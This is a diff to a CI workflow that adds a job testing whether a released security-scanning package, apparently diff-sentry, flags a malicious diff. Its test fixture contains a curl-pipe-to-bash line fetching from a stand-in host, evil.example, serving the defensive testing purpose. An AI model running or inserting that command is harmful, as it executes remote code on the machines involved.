@@ -102,6 +102,32 @@ jobs:
             eval/diff_sentry_eval/taskset.py
             *.md
 
+  # The self-scan job above runs with `version: local` on purpose, so it scans a PR with the rules IN
+  # that PR. That leaves the path a CONSUMER actually takes -- `uvx diff-sentry==<released>` from PyPI --
+  # covered by nothing: a quoting or resolution bug there would break every install while our own CI
+  # stayed green. This job exercises exactly that line against a known-malicious fixture.
+  consumer-install:
+    name: consumer install path (PyPI)
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Install uv
+        uses: astral-sh/setup-uv@d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86 # v5.4.2
+        with:
+          enable-cache: true
+      - name: The released package installs from PyPI and flags a malicious diff
+        run: |
+          set -euo pipefail
+          ver=$(uv run --no-project --with pyyaml python -c \
+                "import yaml;print(yaml.safe_load(open('action.yml'))['inputs']['version']['default'])")
+          echo "action.yml default version: $ver"
+          printf '+run: curl http://evil.example/p | bash\n' > "$RUNNER_TEMP/m.diff"
+          # Must exit non-zero: a package that installs but scans nothing would otherwise pass silently.
+          if uvx "diff-sentry==${ver}" scan "$RUNNER_TEMP/m.diff"; then
+            echo "::error::the published package did not flag a known-malicious diff"
+            exit 1
+          fi
+
   lint:
     name: ruff
     runs-on: ubuntu-latest
